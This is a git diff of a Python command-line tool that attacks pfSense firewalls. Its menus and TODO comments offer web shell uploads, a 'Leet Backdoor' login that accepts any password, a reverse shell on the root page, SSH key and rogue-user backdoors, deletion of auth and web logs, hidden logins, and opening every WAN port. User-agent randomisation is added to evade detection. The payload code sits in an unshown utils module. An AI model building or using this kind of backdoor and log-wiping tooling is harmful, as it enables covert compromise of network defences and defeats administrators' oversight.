@@ -8,31 +8,33 @@
 # SSH needs keys to connect, maybe create a "SSH bootstrap" - DONE
 # Fix login so backdoor password as opposed to all passwords - DONE
 # try cmds through - Site, SSH, Web Shell, Reverse Shell
-# randomize user agents
+# randomize user agents - DONE
 # randomize file names
-# Split function sets into files
+# Split function sets into files - DONE
 # reduce libaries
+# Make it so SSH keys doesn't alert admins
+# find a way to hide logins in shell - DONE
 
 
-# Utils
 import utils
 
 import requests
-import re
 import os
 import base64
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import ipaddress 
-from time import sleep
 from termcolor import colored
+from random import randint
 
 class details:
     # Ips
     ip = ""
     iplong = ""
+    iphex = ""
     url = ""
     pfsenseIP = ""
+    pfippath = ""
     # Creds
     username = ""
     password = ""
@@ -44,10 +46,10 @@ class details:
     cmdOutput = ""
     # Sessions
     session = requests.session()
+    # User Agent
+    agent = ""
 
 
-loggedIn = False
-regex = "sid:.*;var"
 details.session.verify = False
 
 def printMe(text, color, newline):
@@ -75,8 +77,15 @@ def testIDs():
 
     print(idsList)
 
+def setUserAgent(details):
+    with open('utils/Agents.txt', 'r') as file:
+        lines = file.readlines()
+    agent_num = randint(0,len(lines))
+    details.agent = lines[agent_num].strip()
+        
+
 def checkDetails():
-    correct = 6
+    correct = 8 
 
     if(os.path.exists(".settings")):
         with open('.settings', 'r') as file:
@@ -90,6 +99,8 @@ def checkDetails():
         printMe("No Settings File Found", "yellow", 1)
         return False
 
+    folderCheck(details)
+
 def getDetails(details):
     with open('.settings', 'r') as file:
         lines = file.readlines()
@@ -98,34 +109,66 @@ def getDetails(details):
         l_split = l.split(" ")
         if(l_split[0] == "IP-"): details.ip = l_split[1].strip()
         if(l_split[0] == "IPLONG-"): details.iplong = l_split[1].strip()
+        if(l_split[0] == "IPHEX-"): details.iphex = l_split[1].strip()
         if(l_split[0] == "URL-"): details.url = l_split[1].strip()
         if(l_split[0] == "PFSENSEIP-"): details.pfsenseIP = l_split[1].strip()
+        if(l_split[0] == "PFIPPATH-"): details.pfippath = l_split[1].strip()
         if(l_split[0] == "USERNAME-"): details.username = l_split[1].strip()
         if(l_split[0] == "PASSWORD-"): details.password = l_split[1].strip()
+
+    folderCheck(details)
 
 def saveDetails(details):
     with open('.settings', 'w') as file:
         file.write("IP- " + details.ip + "\n")
         file.write("IPLONG- " + details.iplong + "\n")
+        file.write("IPHEX- " + details.iphex + "\n")
         file.write("URL- " + details.url + "\n")
         file.write("PFSENSEIP- " + details.pfsenseIP + "\n")
+        file.write("PFIPPATH- " + details.pfippath + "\n")
         file.write("USERNAME- " + details.username + "\n")
         file.write("PASSWORD- " + details.password+ "\n")
+
+    folderCheck(details)
 
 def setDetails(details):
 
     details.ip = input("Your IP: ")
     details.iplong = '"' + str(int(ipaddress.ip_address(details.ip))) +  '"'
+    a = details.ip.split('.')
+    details.iphex = "0x" + '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, a))
     details.url = input("Pfsense URL: ")
     details.pfsenseIP = input("Pfsense IP: ")
+    details.pfippath = details.pfsenseIP.replace(".", "_")
     details.username = input("Pfsense Username: ")
     details.password = input("Pfsense Password: ")
 
     saveDetails(details)
+    folderCheck(details)
+
+def folderCheck(details):
+    if not os.path.exists(details.pfippath):
+        print("MAKING FOLDER:",  details.pfippath)
+        os.makedirs(details.pfippath)
+
+
+def sshMenu():
+    printMe("Pick Backdoor", "green", 1)
+
+    printMeNum(1, "white")
+    printMe("SSH Keys", "cyan", 1)
+
+    printMeNum(2, "white")
+    printMe("Add User", "cyan", 1)
+
+    printMeNum(10, "white")
+    printMe("Toggle SSH", "cyan", 1)
+
+    printMe("-> ", "magenta", 0)
 
 def mainMenu():
     printMe("Pick One: ", "green", 1)
-    
+   
     printMeNum(1, "white")
     printMe("Upload a WebShell", "cyan", 1)
 
@@ -141,13 +184,28 @@ def mainMenu():
     printMeNum(5, "white")
     printMe("SSH Backdoors", "cyan", 1)
 
+    printMeNum(6, "white")
+    printMe("SCP Files", "cyan", 1)
+
+    printMeNum(7, "white")
+    printMe("Toggle Proxychains", "cyan", 1)
+
+    printMeNum(8, "white")
+    printMe("Execute a CMD via SSH", "cyan", 1)
+
     printMeNum(9, "white")
-    printMe("Execute a CMD", "cyan", 1)
+    printMe("Execute a CMD via Web", "cyan", 1)
 
     printMeNum(10, "white")
     printMe("Full Web Backdoor", "cyan", 1)
 
     printMeNum(11, "white")
+    printMe("Remove Auth/Web Logs", "cyan", 1)
+
+    printMeNum(12, "white")
+    printMe("Enable all WAN ports", "cyan", 1)
+
+    printMeNum(99, "white")
     printMe("Settings", "cyan", 1)
 
     printMe("-> ", "magenta", 0)
@@ -174,6 +232,7 @@ def menu():
     global csrf
     mainMenu()
     choice1 = input()
+
     if(choice1 == "1"):
         menuLevel(0)
         choice2 = input()
@@ -183,6 +242,7 @@ def menu():
     if(choice1 == "2"):
         menuLevel(1)
         choice2 = input()
+        if(choice2 == "0"): utils.initialAccess(details)
         if(choice2 == "1"): utils.skidyAccess(details)
         if(choice2 == "2"): utils.amateurAccess(details)
         if(choice2 == "3"): utils.proAccess(details)
@@ -199,31 +259,70 @@ def menu():
         utils.Popper(details, level)
 
     if(choice1 == "5"):
-        choice2 = input("Pick Backdoor\n(1): Cronjob\n(2): SSH Keys\n(3): Add User\n(10): Toggle SSH\n-> ")
-        if(choice2 == "2"): utils.addSSHKey(details)
-        if(choice2 == "3"): utils.addUser(details)
+        sshMenu()
+        choice2 = input()
+        if(choice2 == "1"): utils.addSSHKey(details)
+        if(choice2 == "2"): utils.addUser(details)
         if(choice2 == "10"): utils.toggleSSH(details)
+    if(choice1 == "6"):
+        printMe("Upload File (0)", "white", 1)
+        printMe("Download File (1)", "white", 1)
+        printMe("-> ", "magenta", 0)
+        direction = input()
+
+        user = input("Username: ")
+
+        if(direction == "0"):
+            filename = input("File to upload: ")
+            path = input("Path on pfsense to upload to: ")
+
+            utils.scpSSH(details, user, direction, filename, path)
+
+        if(direction == "1"):
+            path = input("Full path of file to download: ")
+            filename = input("Output file name: ")
+
+            utils.scpSSH(details, user, direction, filename, path)
+    if(choice1 == "7"):
+        utils.toggleChains(details)
+
+    if(choice1 == "8"):
+        user = input("Username: ")
+        printMe("CMD: ", "magenta", 0)
+        cmd = input()
+        utils.cmdSSH(details, user, cmd)
     if(choice1 == "9"):
         utils.simpleGET(details, "/", "", 0)
         utils.loginPOST(details)
-        cmd = input("CMD: ")
+        printMe("CMD: ", "magenta", 0)
+        cmd = input()
         utils.cmdGET(details, cmd)
     if(choice1 == "10"):
-        print("##### Leet Backdoor #####")
-        print("This will create:\n-Login will accept any password with valid username\n-Web shell on root page\n-Reverse shell on root page\n-PHPSESSIDs put in .ids\n")
-        choice2 = input("This will require a restart of the firewall, is that ok? (1)Yes (2)No\n-> ")
+        printMe("##### Leet Backdoor #####", "white", 1)
+        printMe("This will create:\n-Login that will accept any password with valid username\n-Disable Auth messages in pfsense shell\n-Web shell on root page\n-Reverse shell on root page\n-PHPSESSIDs put in .ids.php\n", "cyan", 1)
+        printMe("This will require a restart of the firewall, is that ok?", "red", 1)
+        printMeNum(1, "white")
+        printMe("Yes\n", "red", 0)
+        printMeNum(2, "white")
+        printMe("No\n", "red", 0)
+        printMe("-> ", "magenta", 0)
+        choice2 = input()
         if(choice2 == "1"): utils.leetUpload(details)
         if(choice2 == "2"): print("Safe one fam")
-    if(choice1 == "11"): setDetails(details)
+    if(choice1 == "11"): utils.removeLogs(details)
+    if(choice1 == "12"): utils.enableAllWan(details)
+    if(choice1 == "99"): setDetails(details)
 
     menu()
 
 def main():
+    setUserAgent(details)
     # Check for .settings file that contains class information
     if(checkDetails()):
         getDetails(details)
     else:
         setDetails(details)
+
 
     menu()
 if __name__ == "__main__":
